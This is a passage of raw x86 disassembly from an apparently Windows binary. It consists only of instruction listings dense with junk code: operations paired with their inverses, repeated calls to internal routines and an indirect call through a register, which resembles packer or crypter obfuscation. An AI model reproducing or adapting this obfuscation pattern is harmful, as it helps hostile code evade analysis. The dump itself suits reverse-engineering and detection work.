  404360:	09 0d 31 94 42 00    	or     %ecx,0x429431
  404366:	87 d7                	xchg   %edx,%edi
  404368:	f7 de                	neg    %esi
  40436a:	ff 15 00 71 40 00    	call   *0x407100
  404370:	e8 58 24 00 00       	call   0x4067cd
  404375:	81 f0 fb d5 5a 2b    	xor    $0x2b5ad5fb,%eax
  40437b:	c1 c6 1b             	rol    $0x1b,%esi
  40437e:	2b c6                	sub    %esi,%eax
  404380:	e8 be d9 ff ff       	call   0x401d43
  404385:	4e                   	dec    %esi
  404386:	21 0d 06 98 42 00    	and    %ecx,0x429806
  40438c:	f7 de                	neg    %esi
  40438e:	2b cb                	sub    %ebx,%ecx
  404390:	c7 05 1a 95 42 00 68 	movl   $0x5af06d68,0x42951a
  404397:	6d f0 5a 
  40439a:	4e                   	dec    %esi
  40439b:	29 15 23 93 42 00    	sub    %edx,0x429323
  4043a1:	33 05 37 9c 42 00    	xor    0x429c37,%eax
  4043a7:	33 f7                	xor    %edi,%esi
  4043a9:	09 35 f8 94 42 00    	or     %esi,0x4294f8
  4043af:	21 1d c0 98 42 00    	and    %ebx,0x4298c0
  4043b5:	f7 de                	neg    %esi
  4043b7:	87 d1                	xchg   %edx,%ecx
  4043b9:	2b c5                	sub    %ebp,%eax
  4043bb:	03 0d 8a 9b 42 00    	add    0x429b8a,%ecx
  4043c1:	03 c5                	add    %ebp,%eax
  4043c3:	87 d1                	xchg   %edx,%ecx
  4043c5:	f7 de                	neg    %esi
  4043c7:	29 15 48 99 42 00    	sub    %edx,0x429948
  4043cd:	21 0d c0 96 42 00    	and    %ecx,0x4296c0
  4043d3:	33 f7                	xor    %edi,%esi
  4043d5:	31 3d 18 97 42 00    	xor    %edi,0x429718
  4043db:	46                   	inc    %esi
  4043dc:	c7 05 f7 94 42 00 72 	movl   $0xfd818472,0x4294f7
  4043e3:	84 81 fd 
  4043e6:	03 cb                	add    %ebx,%ecx
  4043e8:	f7 de                	neg    %esi
  4043ea:	09 15 24 93 42 00    	or     %edx,0x429324
  4043f0:	46                   	inc    %esi
  4043f1:	e8 11 0a 00 00       	call   0x404e07
  4043f6:	03 c6                	add    %esi,%eax
  4043f8:	c1 ce 1b             	ror    $0x1b,%esi
  4043fb:	81 f0 fb d5 5a 2b    	xor    $0x2b5ad5fb,%eax
  404401:	83 c4 10             	add    $0x10,%esp
  404404:	2b 35 bd 9e 42 00    	sub    0x429ebd,%esi
  40440a:	f7 d8                	neg    %eax
  40440c:	81 c6 aa 2a b6 fe    	add    $0xfeb62aaa,%esi
  404412:	33 1d d8 9a 42 00    	xor    0x429ad8,%ebx
  404418:	21 1d da 96 42 00    	and    %ebx,0x4296da
  40441e:	c1 c2 0f             	rol    $0xf,%edx
  404421:	89 0d 08 99 42 00    	mov    %ecx,0x429908
  404427:	33 fa                	xor    %edx,%edi
  404429:	f7 da                	neg    %edx
  40442b:	2b f4                	sub    %esp,%esi
  40442d:	c1 cf 1a             	ror    $0x1a,%edi
  404430:	c1 c7 1a             	rol    $0x1a,%edi
  404433:	03 f4                	add    %esp,%esi
  404435:	f7 da                	neg    %edx
  404437:	33 fa                	xor    %edx,%edi
  404439:	29 1d 49 95 42 00    	sub    %ebx,0x429549
  40443f:	c1 ca 0f             	ror    $0xf,%edx
  404442:	81 ee aa 2a b6 fe    	sub    $0xfeb62aaa,%esi
  404448:	f7 d8                	neg    %eax
  40444a:	be 79 53 ca a4       	mov    $0xa4ca5379,%esi
  40444f:	0b 1d 11 9e 42 00    	or     0x429e11,%ebx
  404455:	21 05 8f 96 42 00    	and    %eax,0x42968f
  40445b:	0b 1d f3 9d 42 00    	or     0x429df3,%ebx
  404461:	87 f2                	xchg   %esi,%edx
  404463:	01 35 57 97 42 00    	add    %esi,0x429757
  404469:	81 0d 48 94 42 00 c1 	orl    $0xcf119ac1,0x429448
  404470:	9a 11 cf 
  404473:	49                   	dec    %ecx
  404474:	0b 05 ab 9d 42 00    	or     0x429dab,%eax
  40447a:	31 05 28 98 42 00    	xor    %eax,0x429828
  404480:	0b 05 37 9f 42 00    	or     0x429f37,%eax
  404486:	f7 de                	neg    %esi
  404488:	4f                   	dec    %edi
  404489:	f7 d6                	not    %esi
  40448b:	c1 c6 05             	rol    $0x5,%esi
  40448e:	33 d8                	xor    %eax,%ebx
  404490:	c1 c0 0b             	rol    $0xb,%eax
  404493:	03 ca                	add    %edx,%ecx
  404495:	81 ef 4c 00 7f 3a    	sub    $0x3a7f004c,%edi
  40449b:	01 15 c5 95 42 00    	add    %edx,0x4295c5
  4044a1:	e8 14 1a 00 00       	call   0x405eba
  4044a6:	f7 d3                	not    %ebx
  4044a8:	e8 5b e0 ff ff       	call   0x402508
  4044ad:	f7 d3                	not    %ebx
  4044af:	01 0d 58 99 42 00    	add    %ecx,0x429958
  4044b5:	81 c7 4c 00 7f 3a    	add    $0x3a7f004c,%edi
  4044bb:	2b ca                	sub    %edx,%ecx
  4044bd:	c1 c8 0b             	ror    $0xb,%eax
  4044c0:	33 d8                	xor    %eax,%ebx
  4044c2:	c1 ce 05             	ror    $0x5,%esi
  4044c5:	f7 d6                	not    %esi
  4044c7:	47                   	inc    %edi
  4044c8:	f7 de                	neg    %esi
  4044ca:	89 15 f6 94 42 00    	mov    %edx,0x4294f6
  4044d0:	41                   	inc    %ecx
  4044d1:	29 15 8d 94 42 00    	sub    %edx,0x42948d
  4044d7:	87 f2                	xchg   %esi,%edx
  4044d9:	29 1d 1c 93 42 00    	sub    %ebx,0x42931c
  4044df:	81 ee b0 70 2b ef    	sub    $0xef2b70b0,%esi
  4044e5:	81 f1 4d bb 80 e9    	xor    $0xe980bb4d,%ecx
  4044eb:	c1 ce 1c             	ror    $0x1c,%esi
  4044ee:	03 c8                	add    %eax,%ecx
  4044f0:	81 f7 27 37 fd 4f    	xor    $0x4ffd3727,%edi
  4044f6:	c1 c3 0c             	rol    $0xc,%ebx
  4044f9:	0b 0d 11 9a 42 00    	or     0x429a11,%ecx
  4044ff:	33 15 c2 9a 42 00    	xor    0x429ac2,%edx
  404505:	29 05 ff 96 42 00    	sub    %eax,0x4296ff
  40450b:	c1 c3 18             	rol    $0x18,%ebx
  40450e:	e8 a0 e0 ff ff       	call   0x4025b3
  404513:	2b d8                	sub    %eax,%ebx
  404515:	c1 cb 19             	ror    $0x19,%ebx
  404518:	81 f7 4a a0 dd a2    	xor    $0xa2dda04a,%edi
  40451e:	2b 05 41 9d 42 00    	sub    0x429d41,%eax
  404524:	89 1d 14 97 42 00    	mov    %ebx,0x429714
  40452a:	33 35 ac 9c 42 00    	xor    0x429cac,%esi
  404530:	03 15 a0 9a 42 00    	add    0x429aa0,%edx
  404536:	87 c3                	xchg   %eax,%ebx
  404538:	0b 1d e7 9c 42 00    	or     0x429ce7,%ebx
  40453e:	33 fd                	xor    %ebp,%edi
  404540:	87 f1                	xchg   %esi,%ecx
  404542:	87 f1                	xchg   %esi,%ecx
  404544:	33 fd                	xor    %ebp,%edi
  404546:	87 c3                	xchg   %eax,%ebx
  404548:	21 35 cb 98 42 00    	and    %esi,0x4298cb
  40454e:	81 f7 4a a0 dd a2    	xor    $0xa2dda04a,%edi
  404554:	c1 c3 19             	rol    $0x19,%ebx
  404557:	03 d8                	add    %eax,%ebx
  404559:	e8 a9 08 00 00       	call   0x404e07
  40455e:	c1 cb 18             	ror    $0x18,%ebx
  404561:	c1 cb 0c             	ror    $0xc,%ebx
  404564:	81 f7 27 37 fd 4f    	xor    $0x4ffd3727,%edi
  40456a:	2b c8                	sub    %eax,%ecx
  40456c:	c1 c6 1c             	rol    $0x1c,%esi
  40456f:	81 f1 4d bb 80 e9    	xor    $0xe980bb4d,%ecx
  404575:	81 ee 89 e2 9e b5    	sub    $0xb59ee289,%esi
  40457b:	0b 0d 75 9d 42 00    	or     0x429d75,%ecx
  404581:	48                   	dec    %eax
  404582:	f7 d2                	not    %edx
  404584:	89 1d 6e 95 42 00    	mov    %ebx,0x42956e
  40458a:	09 35 5a 98 42 00    	or     %esi,0x42985a
  404590:	40                   	inc    %eax
  404591:	87 d6                	xchg   %edx,%esi
  404593:	2b 0d 45 9d 42 00    	sub    0x429d45,%ecx
  404599:	40                   	inc    %eax
  40459a:	81 f6 27 6b af 79    	xor    $0x79af6b27,%esi
  4045a0:	c1 ca 0f             	ror    $0xf,%edx
  4045a3:	33 f8                	xor    %eax,%edi
  4045a5:	48                   	dec    %eax
  4045a6:	89 0d 90 98 42 00    	mov    %ecx,0x429890
  4045ac:	42                   	inc    %edx
  4045ad:	81 35 1e 99 42 00 48 	xorl   $0x9e047a48,0x42991e
  4045b4:	7a 04 9e 
  4045b7:	4a                   	dec    %edx
  4045b8:	09 35 7b 98 42 00    	or     %esi,0x42987b
  4045be:	40                   	inc    %eax
  4045bf:	33 f8                	xor    %eax,%edi
  4045c1:	c1 c2 0f             	rol    $0xf,%edx
  4045c4:	81 f6 27 6b af 79    	xor    $0x79af6b27,%esi
  4045ca:	48                   	dec    %eax
  4045cb:	87 d6                	xchg   %edx,%esi
  4045cd:	48                   	dec    %eax
  4045ce:	21 1d b5 95 42 00    	and    %ebx,0x4295b5
  4045d4:	f7 d2                	not    %edx
  4045d6:	40                   	inc    %eax
  4045d7:	56                   	push   %esi
  4045d8:	4e                   	dec    %esi
  4045d9:	c1 c1 1f             	rol    $0x1f,%ecx
  4045dc:	e8 26 08 00 00       	call   0x404e07
  4045e1:	2b 1d 11 9a 42 00    	sub    0x429a11,%ebx
  4045e7:	03 da                	add    %edx,%ebx
  4045e9:	4f                   	dec    %edi
  4045ea:	e8 18 08 00 00       	call   0x404e07
  4045ef:	03 d1                	add    %ecx,%edx
  4045f1:	33 0d 6c 9a 42 00    	xor    0x429a6c,%ecx
  4045f7:	29 0d f6 93 42 00    	sub    %ecx,0x4293f6
  4045fd:	c1 cb 02             	ror    $0x2,%ebx
  404600:	81 f2 42 8b 98 29    	xor    $0x29988b42,%edx
  404606:	e8 fc 07 00 00       	call   0x404e07
  40460b:	87 c2                	xchg   %eax,%edx
  40460d:	f7 d6                	not    %esi
  40460f:	2b d3                	sub    %ebx,%edx
  404611:	c1 ca 02             	ror    $0x2,%edx
  404614:	81 c6 47 b8 08 37    	add    $0x3708b847,%esi
  40461a:	81 f2 26 41 55 8e    	xor    $0x8e554126,%edx
  404620:	33 1d c9 9c 42 00    	xor    0x429cc9,%ebx
  404626:	87 d1                	xchg   %edx,%ecx
  404628:	87 d1                	xchg   %edx,%ecx
  40462a:	81 f2 26 41 55 8e    	xor    $0x8e554126,%edx
  404630:	81 ee 47 b8 08 37    	sub    $0x3708b847,%esi
  404636:	c1 c2 02             	rol    $0x2,%edx
  404639:	03 d3                	add    %ebx,%edx
  40463b:	f7 d6                	not    %esi
  40463d:	87 c2                	xchg   %eax,%edx
  40463f:	81 f2 42 8b 98 29    	xor    $0x29988b42,%edx
  404645:	c1 c3 02             	rol    $0x2,%ebx
  404648:	2b d1                	sub    %ecx,%edx
  40464a:	e8 a7 10 00 00       	call   0x4056f6
  40464f:	47                   	inc    %edi
  404650:	2b da                	sub    %edx,%ebx
  404652:	c1 c9 1f             	ror    $0x1f,%ecx
  404655:	46                   	inc    %esi
  404656:	b9 6f e1 09 f5       	mov    $0xf509e16f,%ecx
  40465b:	29 1d d4 97 42 00    	sub    %ebx,0x4297d4
  404661:	e8 90 10 00 00       	call   0x4056f6
  404666:	31 1d 6e 98 42 00    	xor    %ebx,0x42986e
  40466c:	47                   	inc    %edi
  40466d:	87 f3                	xchg   %esi,%ebx
  40466f:	21 35 00 96 42 00    	and    %esi,0x429600
  404675:	03 15 67 9f 42 00    	add    0x429f67,%edx
  40467b:	e8 87 07 00 00       	call   0x404e07
  404680:	03 1d b4 9f 42 00    	add    0x429fb4,%ebx
  404686:	f7 df                	neg    %edi
  404688:	81 ef da 14 b4 52    	sub    $0x52b414da,%edi
  40468e:	f7 d6                	not    %esi
  404690:	c1 c0 17             	rol    $0x17,%eax
  404693:	40                   	inc    %eax
  404694:	f7 da                	neg    %edx
  404696:	2b 15 12 9b 42 00    	sub    0x429b12,%edx
  40469c:	e8 19 18 00 00       	call   0x405eba
  4046a1:	f7 da                	neg    %edx
  4046a3:	48                   	dec    %eax
  4046a4:	c1 c8 17             	ror    $0x17,%eax
  4046a7:	f7 d6                	not    %esi
  4046a9:	81 c7 da 14 b4 52    	add    $0x52b414da,%edi
  4046af:	f7 df                	neg    %edi
  4046b1:	e8 51 07 00 00       	call   0x404e07
  4046b6:	31 3d d5 95 42 00    	xor    %edi,0x4295d5
  4046bc:	87 f3                	xchg   %esi,%ebx
  4046be:	4f                   	dec    %edi
  4046bf:	29 35 4c 94 42 00    	sub    %esi,0x42944c
  4046c5:	e8 5d e5 ff ff       	call   0x402c27
  4046ca:	09 0d 3d 93 42 00    	or     %ecx,0x42933d
  4046d0:	81 e9 d5 b0 75 61    	sub    $0x6175b0d5,%ecx
  4046d6:	f7 d6                	not    %esi
  4046d8:	87 f0                	xchg   %esi,%eax
  4046da:	09 0d 40 94 42 00    	or     %ecx,0x429440
  4046e0:	81 f0 4c b6 72 b5    	xor    $0xb572b64c,%eax
  4046e6:	33 f7                	xor    %edi,%esi
  4046e8:	09 3d 66 93 42 00    	or     %edi,0x429366
  4046ee:	e8 b7 e6 ff ff       	call   0x402daa
  4046f3:	f7 d7                	not    %edi
  4046f5:	81 c7 ce 26 79 05    	add    $0x57926ce,%edi
  4046fb:	81 2d 55 96 42 00 31 	subl   $0xd8dd3e31,0x429655
  404702:	3e dd d8 
  404705:	c1 ca 05             	ror    $0x5,%edx
  404708:	c1 c2 05             	rol    $0x5,%edx
  40470b:	81 05 71 93 42 00 9e 	addl   $0xebe59a9e,0x429371
  404712:	9a e5 eb 
  404715:	81 ef ce 26 79 05    	sub    $0x57926ce,%edi
  40471b:	f7 d7                	not    %edi
  40471d:	e8 3f e2 ff ff       	call   0x402961
  404722:	33 f7                	xor    %edi,%esi
  404724:	81 f0 4c b6 72 b5    	xor    $0xb572b64c,%eax
  40472a:	01 05 ef 98 42 00    	add    %eax,0x4298ef
  404730:	87 f0                	xchg   %esi,%eax
  404732:	f7 d6                	not    %esi
  404734:	81 e9 9a 00 94 93    	sub    $0x9394009a,%ecx
  40473a:	03 15 15 9e 42 00    	add    0x429e15,%edx
  404740:	81 c3 88 4b e2 02    	add    $0x2e24b88,%ebx
  404746:	f7 d8                	neg    %eax
  404748:	0b 15 a2 9b 42 00    	or     0x429ba2,%edx
  40474e:	41                   	inc    %ecx
  40474f:	33 dd                	xor    %ebp,%ebx
  404751:	f7 d0                	not    %eax
  404753:	33 35 f5 9c 42 00    	xor    0x429cf5,%esi
  404759:	31 15 26 97 42 00    	xor    %edx,0x429726
  40475f:	81 f3 4e bc a8 7b    	xor    $0x7ba8bc4e,%ebx
  404765:	43                   	inc    %ebx
  404766:	03 15 af 9a 42 00    	add    0x429aaf,%edx
  40476c:	42                   	inc    %edx
  40476d:	81 e9 7b 14 78 6e    	sub    $0x6e78147b,%ecx
  404773:	e8 ba 1d 00 00       	call   0x406532
  404778:	e8 8a 06 00 00       	call   0x404e07
  40477d:	81 c1 7b 14 78 6e    	add    $0x6e78147b,%ecx
  404783:	4a                   	dec    %edx
  404784:	4b                   	dec    %ebx
  404785:	81 f3 4e bc a8 7b    	xor    $0x7ba8bc4e,%ebx
  40478b:	89 0d 0a 93 42 00    	mov    %ecx,0x42930a
  404791:	f7 d0                	not    %eax
  404793:	33 dd                	xor    %ebp,%ebx
  404795:	49                   	dec    %ecx
  404796:	f7 d8                	neg    %eax
  404798:	81 eb 88 4b e2 02    	sub    $0x2e24b88,%ebx
  40479e:	51                   	push   %ecx
  40479f:	2b c6                	sub    %esi,%eax
  4047a1:	33 dd                	xor    %ebp,%ebx
  4047a3:	c1 cf 1c             	ror    $0x1c,%edi
  4047a6:	f7 db                	neg    %ebx
  4047a8:	4b                   	dec    %ebx
  4047a9:	87 f3                	xchg   %esi,%ebx
  4047ab:	f7 db                	neg    %ebx
  4047ad:	49                   	dec    %ecx
  4047ae:	e8 54 06 00 00       	call   0x404e07
  4047b3:	42                   	inc    %edx
  4047b4:	c1 c7 05             	rol    $0x5,%edi
  4047b7:	f7 d9                	neg    %ecx
  4047b9:	e8 49 06 00 00       	call   0x404e07
  4047be:	e8 f7 16 00 00       	call   0x405eba
  4047c3:	e8 99 e1 ff ff       	call   0x402961
  4047c8:	e8 3a 06 00 00       	call   0x404e07
  4047cd:	f7 d9                	neg    %ecx
  4047cf:	c1 cf 05             	ror    $0x5,%edi
  4047d2:	4a                   	dec    %edx
  4047d3:	e8 2f 06 00 00       	call   0x404e07
  4047d8:	41                   	inc    %ecx
  4047d9:	f7 db                	neg    %ebx
  4047db:	87 f3                	xchg   %esi,%ebx
  4047dd:	43                   	inc    %ebx
  4047de:	f7 db                	neg    %ebx
  4047e0:	c1 c7 1c             	rol    $0x1c,%edi
  4047e3:	33 dd                	xor    %ebp,%ebx
  4047e5:	03 c6                	add    %esi,%eax
  4047e7:	68 af 23 08 00       	push   $0x823af
  4047ec:	87 d1                	xchg   %edx,%ecx
  4047ee:	46                   	inc    %esi
  4047ef:	33 f4                	xor    %esp,%esi
  4047f1:	c1 ca 1c             	ror    $0x1c,%edx
  4047f4:	2b 05 9c 9d 42 00    	sub    0x429d9c,%eax
  4047fa:	e8 3c 0d 00 00       	call   0x40553b
  4047ff:	2b 15 33 9c 42 00    	sub    0x429c33,%edx
  404805:	f7 da                	neg    %edx
  404807:	e8 44 ea ff ff       	call   0x403250
  40480c:	4b                   	dec    %ebx
  40480d:	33 d7                	xor    %edi,%edx
  40480f:	01 1d 4a 94 42 00    	add    %ebx,0x42944a
  404815:	46                   	inc    %esi
  404816:	4f                   	dec    %edi
  404817:	f7 de                	neg    %esi
  404819:	e8 23 d3 ff ff       	call   0x401b41
  40481e:	e8 aa 1f 00 00       	call   0x4067cd
  404823:	f7 de                	neg    %esi
  404825:	47                   	inc    %edi
  404826:	4e                   	dec    %esi
  404827:	29 05 08 94 42 00    	sub    %eax,0x429408
  40482d:	33 d7                	xor    %edi,%edx
  40482f:	43                   	inc    %ebx
  404830:	f7 da                	neg    %edx
  404832:	e8 e1 d0 ff ff       	call   0x401918
  404837:	c1 c2 1c             	rol    $0x1c,%edx
  40483a:	33 f4                	xor    %esp,%esi
  40483c:	4e                   	dec    %esi
  40483d:	87 d1                	xchg   %edx,%ecx
  40483f:	be bf a0 75 60       	mov    $0x6075a0bf,%esi
  404844:	03 d3                	add    %ebx,%edx
  404846:	2b c7                	sub    %edi,%eax
  404848:	33 3d fb 9c 42 00    	xor    0x429cfb,%edi
  40484e:	33 dd                	xor    %ebp,%ebx
  404850:	49                   	dec    %ecx
  404851:	09 0d 57 94 42 00    	or     %ecx,0x429457
  404857:	c1 ca 18             	ror    $0x18,%edx
  40485a:	e8 a8 05 00 00       	call   0x404e07
  40485f:	0b 35 96 9c 42 00    	or     0x429c96,%esi
  404865:	49                   	dec    %ecx
  404866:	89 3d 11 97 42 00    	mov    %edi,0x429711
  40486c:	81 25 28 98 42 00 86 	andl   $0x9856b86,0x429828
  404873:	6b 85 09 
  404876:	03 c5                	add    %ebp,%eax
  404878:	33 f1                	xor    %ecx,%esi
  40487a:	31 0d ac 94 42 00    	xor    %ecx,0x4294ac
  404880:	f7 d6                	not    %esi
  404882:	47                   	inc    %edi
  404883:	43                   	inc    %ebx
  404884:	89 3d 62 97 42 00    	mov    %edi,0x429762
  40488a:	40                   	inc    %eax
  40488b:	81 35 d9 98 42 00 47 	xorl   $0x5b2e8547,0x4298d9
  404892:	85 2e 5b 
  404895:	48                   	dec    %eax
  404896:	4b                   	dec    %ebx
  404897:	4f                   	dec    %edi
  404898:	f7 d6                	not    %esi
  40489a:	89 0d 62 98 42 00    	mov    %ecx,0x429862
  4048a0:	33 f1                	xor    %ecx,%esi
  4048a2:	2b c5                	sub    %ebp,%eax
  4048a4:	41                   	inc    %ecx
  4048a5:	c1 c2 18             	rol    $0x18,%edx
  4048a8:	01 3d 85 94 42 00    	add    %edi,0x429485
  4048ae:	41                   	inc    %ecx
  4048af:	33 dd                	xor    %ebp,%ebx
  4048b1:	03 c7                	add    %edi,%eax
  4048b3:	2b d3                	sub    %ebx,%edx
  4048b5:	81 c6 43 be 9d d8    	add    $0xd89dbe43,%esi
  4048bb:	c1 c8 17             	ror    $0x17,%eax
  4048be:	f7 db                	neg    %ebx
  4048c0:	0b 15 a4 99 42 00    	or     0x4299a4,%edx
  4048c6:	c1 c8 13             	ror    $0x13,%eax
  4048c9:	f7 d3                	not    %ebx
  4048cb:	81 c0 0e fb b4 a2    	add    $0xa2b4fb0e,%eax
  4048d1:	2b f7                	sub    %edi,%esi
  4048d3:	c1 c9 14             	ror    $0x14,%ecx
  4048d6:	f7 d6                	not    %esi
  4048d8:	33 d7                	xor    %edi,%edx
  4048da:	81 c7 e4 28 52 05    	add    $0x55228e4,%edi
  4048e0:	e8 bd d9 ff ff       	call   0x4022a2
  4048e5:	e8 31 d8 ff ff       	call   0x40211b
  4048ea:	81 ef e4 28 52 05    	sub    $0x55228e4,%edi
  4048f0:	33 d7                	xor    %edi,%edx
  4048f2:	f7 d6                	not    %esi
  4048f4:	c1 c1 14             	rol    $0x14,%ecx
  4048f7:	03 f7                	add    %edi,%esi
  4048f9:	81 e8 0e fb b4 a2    	sub    $0xa2b4fb0e,%eax
  4048ff:	f7 d3                	not    %ebx
  404901:	c1 c0 13             	rol    $0x13,%eax
  404904:	f7 db                	neg    %ebx
  404906:	c1 c0 17             	rol    $0x17,%eax
  404909:	81 f6 02 5f 13 39    	xor    $0x39135f02,%esi
  40490f:	21 3d 8c 94 42 00    	and    %edi,0x42948c
  404915:	87 d1                	xchg   %edx,%ecx
  404917:	03 c5                	add    %ebp,%eax
  404919:	31 0d f4 96 42 00    	xor    %ecx,0x4296f4
  40491f:	c1 c6 1d             	rol    $0x1d,%esi
  404922:	81 ee af e7 f2 d2    	sub    $0xd2f2e7af,%esi
  404928:	f7 d6                	not    %esi
  40492a:	21 0d b0 94 42 00    	and    %ecx,0x4294b0
  404930:	4f                   	dec    %edi
  404931:	e8 8c cb ff ff       	call   0x4014c2
  404936:	87 f0                	xchg   %esi,%eax
  404938:	c1 c3 01             	rol    $0x1,%ebx
  40493b:	e8 a1 06 00 00       	call   0x404fe1
  404940:	c1 cb 01             	ror    $0x1,%ebx
  404943:	87 f0                	xchg   %esi,%eax
  404945:	47                   	inc    %edi
  404946:	01 35 46 93 42 00    	add    %esi,0x429346
  40494c:	f7 d6                	not    %esi
  40494e:	81 c6 af e7 f2 d2    	add    $0xd2f2e7af,%esi
  404954:	c1 ce 1d             	ror    $0x1d,%esi
  404957:	89 0d af 95 42 00    	mov    %ecx,0x4295af
  40495d:	2b c5                	sub    %ebp,%eax
  40495f:	87 d1                	xchg   %edx,%ecx
  404961:	56                   	push   %esi
  404962:	c7 05 ad 97 42 00 46 	movl   $0x558f2146,0x4297ad
  404969:	21 8f 55 
  40496c:	f7 d9                	neg    %ecx
  40496e:	4b                   	dec    %ebx
  40496f:	c1 cb 07             	ror    $0x7,%ebx
  404972:	87 c2                	xchg   %eax,%edx
  404974:	43                   	inc    %ebx
  404975:	33 0d ff 99 42 00    	xor    0x4299ff,%ecx
  40497b:	c1 cf 08             	ror    $0x8,%edi
  40497e:	87 f1                	xchg   %esi,%ecx
  404980:	21 35 29 97 42 00    	and    %esi,0x429729
  404986:	33 d1                	xor    %ecx,%edx
  404988:	33 05 34 9f 42 00    	xor    0x429f34,%eax
  40498e:	e8 bd e8 ff ff       	call   0x403250
  404993:	2b 05 22 9e 42 00    	sub    0x429e22,%eax
  404999:	e8 69 04 00 00       	call   0x404e07
  40499e:	f7 d6                	not    %esi
  4049a0:	81 ea 3e 8e 7a c1    	sub    $0xc17a8e3e,%edx
  4049a6:	81 c2 3e 8e 7a c1    	add    $0xc17a8e3e,%edx
  4049ac:	f7 d6                	not    %esi
  4049ae:	33 d1                	xor    %ecx,%edx
  4049b0:	87 f1                	xchg   %esi,%ecx
  4049b2:	c1 c7 08             	rol    $0x8,%edi
  4049b5:	4b                   	dec    %ebx
  4049b6:	87 c2                	xchg   %eax,%edx
  4049b8:	c1 c3 07             	rol    $0x7,%ebx
  4049bb:	43                   	inc    %ebx
  4049bc:	f7 d9                	neg    %ecx
  4049be:	81 0d a5 97 42 00 00 	orl    $0x25952a00,0x4297a5
  4049c5:	2a 95 25 
  4049c8:	ff d0                	call   *%eax
  4049ca:	c1 cb 14             	ror    $0x14,%ebx
  4049cd:	2b f3                	sub    %ebx,%esi
  4049cf:	81 c0 3b 93 62 bb    	add    $0xbb62933b,%eax
  4049d5:	03 3d a9 9a 42 00    	add    0x429aa9,%edi
  4049db:	0b 05 ad 9e 42 00    	or     0x429ead,%eax
  4049e1:	01 3d 76 97 42 00    	add    %edi,0x429776
  4049e7:	03 05 16 9b 42 00    	add    0x429b16,%eax
  4049ed:	31 15 33 93 42 00    	xor    %edx,0x429333
  4049f3:	2b c3                	sub    %ebx,%eax
  4049f5:	f7 d7                	not    %edi
  4049f7:	e8 36 1b 00 00       	call   0x406532
  4049fc:	33 1d 81 9b 42 00    	xor    0x429b81,%ebx
  404a02:	0b 15 1f 9c 42 00    	or     0x429c1f,%edx
  404a08:	f7 d7                	not    %edi
  404a0a:	03 c3                	add    %ebx,%eax
  404a0c:	21 15 8d 94 42 00    	and    %edx,0x42948d
  404a12:	01 3d 21 99 42 00    	add    %edi,0x429921
  404a18:	81 e8 3b 93 62 bb    	sub    $0xbb62933b,%eax
  404a1e:	03 f3                	add    %ebx,%esi
  404a20:	c1 c3 14             	rol    $0x14,%ebx
  404a23:	8d 35 93 9c b9 68    	lea    0x68b99c93,%esi
  404a29:	e8 e1 07 00 00       	call   0x40520f
  404a2e:	2b f7                	sub    %edi,%esi
  404a30:	49                   	dec    %ecx
  404a31:	81 f1 72 9b 7b 83    	xor    $0x837b9b72,%ecx
  404a37:	c1 c8 06             	ror    $0x6,%eax
  404a3a:	09 1d ed 93 42 00    	or     %ebx,0x4293ed
  404a40:	31 1d 38 98 42 00    	xor    %ebx,0x429838
  404a46:	87 c1                	xchg   %eax,%ecx
  404a48:	31 05 4c 96 42 00    	xor    %eax,0x42964c
  404a4e:	e8 b4 03 00 00       	call   0x404e07
  404a53:	87 d6                	xchg   %edx,%esi
  404a55:	0b 3d 44 9b 42 00    	or     0x429b44,%edi
  404a5b:	48                   	dec    %eax
  404a5c:	33 cc                	xor    %esp,%ecx
  404a5e:	03 35 3c 9d 42 00    	add    0x429d3c,%esi
  404a64:	81 0d 70 95 42 00 b4 	orl    $0x45a59b4,0x429570
  404a6b:	59 5a 04 
  404a6e:	49                   	dec    %ecx
  404a6f:	81 c3 bb 42 96 39    	add    $0x399642bb,%ebx
  404a75:	e8 7b d5 ff ff       	call   0x401ff5
  404a7a:	01 35 8f 96 42 00    	add    %esi,0x42968f
  404a80:	09 35 bc 97 42 00    	or     %esi,0x4297bc
  404a86:	e8 28 db ff ff       	call   0x4025b3
  404a8b:	81 eb bb 42 96 39    	sub    $0x399642bb,%ebx
  404a91:	41                   	inc    %ecx
  404a92:	81 25 05 95 42 00 ba 	andl   $0x7325a2ba,0x429505
  404a99:	a2 25 73 
  404a9c:	33 cc                	xor    %esp,%ecx
  404a9e:	40                   	inc    %eax
  404a9f:	87 d6                	xchg   %edx,%esi
  404aa1:	e8 81 e1 ff ff       	call   0x402c27
  404aa6:	87 c1                	xchg   %eax,%ecx
  404aa8:	01 15 58 99 42 00    	add    %edx,0x429958
  404aae:	89 35 30 98 42 00    	mov    %esi,0x429830
  404ab4:	c1 c0 06             	rol    $0x6,%eax
  404ab7:	81 f1 72 9b 7b 83    	xor    $0x837b9b72,%ecx
  404abd:	41                   	inc    %ecx
  404abe:	03 f7                	add    %edi,%esi
  404ac0:	e8 42 03 00 00       	call   0x404e07
  404ac5:	81 f6 f0 6f bc e3    	xor    $0xe3bc6ff0,%esi
  404acb:	f7 d3                	not    %ebx
  404acd:	09 35 38 95 42 00    	or     %esi,0x429538
  404ad3:	c1 ca 11             	ror    $0x11,%edx
  404ad6:	4a                   	dec    %edx
  404ad7:	c1 c6 13             	rol    $0x13,%esi
  404ada:	0b 15 ab 9f 42 00    	or     0x429fab,%edx
  404ae0:	f7 de                	neg    %esi
  404ae2:	e8 69 e7 ff ff       	call   0x403250
  404ae7:	c1 c2 04             	rol    $0x4,%edx
  404aea:	89 3d 1e 98 42 00    	mov    %edi,0x42981e
  404af0:	2b 15 ff 9c 42 00    	sub    0x429cff,%edx
  404af6:	e8 55 e7 ff ff       	call   0x403250
  404afb:	e8 17 dc ff ff       	call   0x402717
  404b00:	21 0d bc 95 42 00    	and    %ecx,0x4295bc
  404b06:	c1 ca 04             	ror    $0x4,%edx
  404b09:	e8 f9 02 00 00       	call   0x404e07
  404b0e:	f7 de                	neg    %esi
  404b10:	c1 ce 13             	ror    $0x13,%esi
  404b13:	42                   	inc    %edx
  404b14:	c1 c2 11             	rol    $0x11,%edx
  404b17:	21 35 a6 96 42 00    	and    %esi,0x4296a6
  404b1d:	f7 d3                	not    %ebx
  404b1f:	81 ee 63 65 be 8a    	sub    $0x8abe6563,%esi
  404b25:	c1 c3 10             	rol    $0x10,%ebx
  404b28:	33 05 78 99 42 00    	xor    0x429978,%eax
  404b2e:	e8 8f c9 ff ff       	call   0x4014c2
  404b33:	03 1d 3f 9b 42 00    	add    0x429b3f,%ebx
  404b39:	81 25 5e 97 42 00 f9 	andl   $0x9f3e34f9,0x42975e
  404b40:	34 3e 9f 
  404b43:	c1 c1 02             	rol    $0x2,%ecx
  404b46:	f7 d7                	not    %edi
  404b48:	c1 cf 15             	ror    $0x15,%edi
